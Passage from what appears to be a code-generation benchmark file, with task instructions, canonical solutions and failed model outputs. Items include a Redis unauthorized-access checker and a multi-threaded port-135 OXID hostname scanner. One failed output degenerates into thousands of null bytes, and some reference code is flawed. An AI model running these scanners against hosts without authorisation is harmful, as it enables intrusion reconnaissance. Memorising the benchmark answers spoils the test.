self._remote_sock = self._create_remote_socket(ip, self._remote_address[1])\n            self._remote_sock_fd = self._remote_sock.fileno()\n            self._fd_to_handlers[self._remote_sock_fd] = self\n            self._stage = 1\n        else:\n            self.destroy()\n\n    def _write_to_sock(self, data, sock):\n        try:\n            sock.sendall(data)\n            return data\n        except socket.error:\n            return None\n\n    def _on_local_read(self):\n        data = self._local_sock.recv(4096)\n        if data:\n            if self._encryptor:\n                data = self._encryptor.encrypt(data)\n            if self._obfs:\n                data = self._obfs.obfuscate(data)\n            if self._protocol:\n                data = self._protocol.handle_local_data(data)\n            self._data_to_write_to_remote.append(data)\n            self._loop.modify_writer(self._remote_sock_fd)\n        else:\n            self.destroy()\n\n    def _on_remote_read(self):\n        data = self._remote_sock.recv(4096)\n        if data:\n            if self._protocol:\n                data = self._protocol.handle_remote_data(data)\n            if self._obfs:\n                data = self._obfs.deobfuscate(data)\n            if self._encryptor:\n                data = self._encryptor.decrypt(data)\n            self._write_to_sock(data, self._local_sock)\n        else:\n            self.destroy()\n\n    def _on_remote_write(self):\n        if self._data_to_write_to_remote:\n            data = self._data_to_write_to_remote.pop(0)\n            if data is not None:\n                self._write_to_sock(data, self._remote_sock)\n            else:\n                self.destroy()\n        else:\n            self._loop.modify_writer(self._remote_sock_fd, False)\n\n    def handle_event(self, sock, fd, event):\n        if sock == self._local_sock:\n            if event & selectors.EVENT_READ:\n                self._on_local_read()\n            if event & selectors.EVENT_WRITE:\n                self._on_remote_write()\n        elif sock == self._remote_sock:\n            if event & selectors.EVENT_READ:\n                self._on_remote_read()\n            if event & selectors.EVENT_WRITE:\n                self._on_remote_write()\n\n    def destroy(self):\n        if self._local_sock:\n            self._loop.remove_reader(self._local_sock_fd)\n            self._loop.remove_writer(self._local_sock_fd)\n            self._local_sock.close()\n            self._local_sock = None\n        if self._remote_sock:\n            self._loop.remove_reader(self._remote_sock_fd)\n            self._loop.remove_writer(self._remote_sock_fd)\n            self._remote_sock.close()\n            self._remote_sock = None\n        if self._local_sock_fd in self._fd_to_handlers:\n            del self._fd_to_handlers[self._local_sock_fd]\n        if self._remote_sock_fd in self._fd_to_handlers:\n            del self._fd_to_handlers[self._remote_sock_fd]\n```\n"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a function to probe an HTTP server's connectivity and response behavior, checking for potential network interference or server availability issues.\n\nFunction Description: The function attempts to connect to an HTTP server, send a GET request with a specific keyword, and analyze the response. It also checks Redis for potential firewall interference patterns. The function returns different status codes based on the server's response and network conditions.\n\nInput:\n- domain: [str] - The domain name of the target server\n- ip: [str] - The IP address of the target server\n- keyword: [str] - The search keyword to include in the GET request\n\nOutput:\n- [int] - Returns one of the following status codes:\n  * RET_SUCCESS (1) if server responds normally\n  * RET_SVR_NO_RESP (2) if server doesn't respond or times out\n  * RET_GFW_RST (3) if firewall interference is detected\n  * RET_OTHER (99) for other unexpected errors",
    "Canonical_solution": "import os\nimport socket\nimport errno\nimport time\nimport redis\nimport struct\n\nRET_SUCCESS = 1\nRET_SVR_NO_RESP = 2\nRET_GFW_RST = 3\nRET_OTHER = 99\n\ndef probe_http_server(domain, ip, keyword):\n    redis_conn = redis.StrictRedis(host='localhost', port=6389, db=0)\n\n    ret = 0\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect((ip, 80))\n        s.sendall(\"GET /?keyword=%s HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\nUser-Agent: connectivity measurement\\r\\n\\r\\n\" % (keyword, domain))\n        data = s.recv(1024)\n        s.shutdown(socket.SHUT_RDWR)\n        s.close()\n        if data and len(data) > 1:\n            ret = 1\n    except socket.timeout:\n        ret = 0\n    except socket.error, serr:\n        if serr[0] == errno.ECONNRESET:\n            ret = -1\n        elif serr[0] == errno.ETIMEDOUT:\n            ret = 0\n        else:\n            ret = -99\n    except Exception, err:\n        ret = -99\n\n    time.sleep(2)\n    type1rst = redis_conn.keys(\"rst:attack1:*_%d\" % ip2int(ip))\n    type2rst = redis_conn.keys(\"rst:attack2:*_%d\" % ip2int(ip))\n    if type1rst or type2rst:\n        return RET_GFW_RST\n    else:\n        if ret == -1:\n            return RET_SVR_NO_RESP\n        elif ret == 0:\n            return RET_SVR_NO_RESP\n        elif ret == 1:\n            return RET_SUCCESS\n        else:\n            return RET_OTHER\n\ndef ip2int(addr):                                                               \n    return struct.unpack(\"I\", socket.inet_aton(addr))[0]",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport requests\nimport redis\n\ndef probe_http_server(domain, ip, keyword):\n    url = f\"http://{domain}\"\n    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}\n    params = {'q': keyword}\n    try:\n        response = requests.get(url, headers=headers, params=params, timeout=5)\n        if response.status_code == 200:\n            return 1\n        else:\n            return 99\n    except requests.exceptions.Timeout:\n        return 2\n    except requests.exceptions.ConnectionError:\n        r = redis.Redis(host='localhost', port=6379, db=0)\n        if r.get(ip):\n            return 3\n        else:\n            return 99\n```"
  },
  {
    "Task_id": 327,
    "Instruction": "Task Description: Write a Python function to check for unauthorized access to a Redis server by attempting to connect and retrieve server information without authentication.\n\nFunction Description: The function attempts to connect to a Redis server at a specified IP address and port (default 6379) using a TCP socket. It sends a Redis INFO command payload and checks the response for server version information, which would indicate unauthorized access is possible. The function includes error handling and a timeout for the connection attempt.\n\nInput:\n- ip: str - The IP address of the target Redis server\n- port: int (optional, default=6379) - The port number of the Redis server\n- timeout: int (optional, default=5) - Connection timeout in seconds\n\nOutput:\n- str or None - Returns a warning message '6379 Redis Unauthorized Access' if unauthorized access is detected, otherwise returns None",
    "Canonical_solution": "import socket\n\ndef check_redis_unauthorized_access(ip, port=6379, timeout=5):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(timeout)\n    try:\n        s.connect((ip, port))\n        payload = b'\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a'\n        s.send(payload)\n        data = s.recv(1024)\n        s.close()\n        if b\"redis_version\" in data:\n            return '6379 Redis Unauthorized Access'\n    except Exception as e:\n        s.close()\n    return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef redis_unauthorized_access(ip, port=6379, timeout=5):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(timeout)\n        sock.connect((ip, port))\n        payload = b'*1\\r\\n$4\\r\\nINFO\\r\\n'\n        sock.sendall(payload)\n        response = sock.recv(1024).decode()\n        if 'redis_version' in response:\n            return '6379 Redis Unauthorized Access'\n    except socket.error:\n        pass\n    return None\n```"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Implement a function that detects alive hosts and retrieves their hostnames by establishing TCP connections to port 135 and exchanging specific binary packets.\n\nFunction Description: The function `oxid` is designed to scan a queue of IP addresses, attempt TCP connections to port 135 on each, and exchange binary packets to retrieve hostname information. It operates in a multi-threaded environment, processing IPs from a shared queue and updating a progress bar. Detected hostnames are appended to a shared list.\n\nInput:\n- `alive_host_Queue`: [Queue] - A thread-safe queue containing IP addresses to scan\n- `pbar`: [ProgressBar] - A progress bar object to update as IPs are processed\n- `alive_hostname_ips`: [List] - A shared list to store results in format [ip, hostname1, hostname2,...]\n\nOutput: None (results are appended to the input `alive_hostname_ips` list)",
    "Canonical_solution": "import socket\nfrom queue import Queue\nfrom threading import Thread\n\ndef oxid(alive_host_Queue, pbar, alive_hostname_ips):\n    def run_detect():\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        try:\n            sock.connect((ip, 135))\n            buffer_v1 = b\"\\x05\\x00\\x0b\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xb8\\x10\\xb8\\x10\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\xc4\\xfe\\xfc\\x99\\x60\\x52\\x1b\\x10\\xbb\\xcb\\x00\\xaa\\x00\\x21\\x34\\x7a\\x00\\x00\\x00\\x00\\x04\\x5d\\x88\\x8a\\xeb\\x1c\\xc9\\x11\\x9f\\xe8\\x08\\x00\\x2b\\x10\\x48\\x60\\x02\\x00\\x00\\x00\"\n            buffer_v2 = b\"\\x05\\x00\\x00\\x03\\x10\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\"\n            sock.send(buffer_v1)\n            packet = sock.recv(1024)\n            sock.send(buffer_v2)\n            packet = sock.recv(4096)\n            packet_v2 = packet[42:]\n            packet_v2_end = packet_v2.find(b\"\\x09\\x00\\xff\\xff\\x00\\x00\")\n            packet_v2 = packet_v2[:packet_v2_end]\n            hostname_list = packet_v2.split(b\"\\x00\\x00\")\n            result = [ip]\n            for h in hostname_list:\n                h = h.replace(b'\\x07\\x00', b'')\n                h = h.replace(b'\\x00', b'')\n                if h == b'':\n                    continue\n                h = h.decode('utf-8')\n                result.append(h)\n            alive_hostname_ips.append(result)\n        except Exception as e:\n            pass\n        finally:\n            sock.close()\n\n    while not alive_host_Queue.empty():\n        ip = alive_host_Queue.get()\n        run_detect()\n        pbar.update(1)\n        alive_host_Queue.task_done()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\ndef oxid(alive_host_Queue, pbar, alive_hostname_ips):\n    while True:\n        try:\n            ip = alive_host_Queue.get(timeout=1)\n        except queue.Empty:\n            break\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(1)\n            s.connect((ip, 135))\n            s.send(struct.pack('<BBH', 0x05, 0x00, 0x00))\n            data = s.recv(1024)\n            s.close()\n            if data[8:10] == b'\\x05\\x01':\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.settimeout(1)\n                s.connect((ip, 135))\n                s.send(struct.pack('<BBH', 0x05, 0x01, 0x00))\n                s.send(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the SambaVerse API, handling request construction, response processing, and error management.\n\nClass Description: The SambaVerseClient class provides an interface to communicate with the SambaVerse API, sending chat messages and receiving completions. It handles API authentication, request formatting, and response conversion.\n\nAttributes:\n_api_key: str - The API key for authentication with the SambaVerse service\nmodel_type: str - The model type/name to be used for completions\n_url: str - The endpoint URL for the SambaVerse API\nmodel_config_dict: Dict[str, Any] - Configuration parameters for the model (temperature, max_tokens, etc.)\n\nMethods:\n__init__(api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None - Initializes the client with API credentials and configuration\nsend_request(messages: List[OpenAIMessage]) -> ChatCompletion - Sends a chat completion request to the API and returns the processed response\n_convert_response(samba_response: Dict[str, Any]) -> ChatCompletion - Converts the raw API response into a standardized ChatCompletion object",
    "Canonical_solution": "import json\nimport uuid\nfrom typing import Any, Dict, List, Optional, Union\n\nimport httpx\nfrom camel.messages import OpenAIMessage\nfrom camel.types import ChatCompletion, CompletionUsage\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]):\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"key\": str(self._api_key),\n            \"modelName\": self.model_type,\n        }\n\n        data = {\n            \"instance\": json.dumps({\n                \"conversation_id\": str(uuid.uuid4()),\n                \"messages\": messages,\n            }),\n            \"params\": {\n                \"do_sample\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"max_tokens_to_generate\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"max_tokens\")),\n                },\n                \"process_prompt\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"repetition_penalty\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"repetition_penalty\")),\n                },\n                \"return_token_count_only\": {\"type\": \"bool\", \"value\": \"false\"},\n                \"select_expert\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_type.split('/')[1],\n                },\n                \"stop_sequences\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_config_dict.get(\"stop_sequences\"),\n                },\n                \"temperature\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"temperature\")),\n                },\n                \"top_k\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"top_k\")),\n                },\n                \"top_p\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"top_p\")),\n                },\n            },\n        }\n\n        with httpx.Client() as client:\n            response = client.post(\n                self._url,\n                headers=headers,\n                json=data,\n            )\n\n        raw_text = response.text\n        dicts = raw_text.split('}\\n{')\n        last_dict = '{' + dicts[-1]\n        last_dict = json.loads(last_dict)\n        return self._convert_response(last_dict)\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        choices = [\n            dict(\n                index=0,\n                message={\n                    \"role\": 'assistant',\n                    \"content\": samba_response['result']['responses'][0]['completion'],\n                },\n                finish_reason=samba_response['result']['responses'][0]['stop_reason'],\n            )\n        ]\n\n        return ChatCompletion.construct(\n            id=None,\n            choices=choices,\n            created=int(time.time()),\n            model=self.model_type,\n            object=\"chat.completion\",\n            usage=CompletionUsage(\n                completion_tokens=0,\n                prompt_tokens=0,\n                total_tokens=int(samba_response['result']['responses'][0]['total_tokens_count']),\n            ),\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
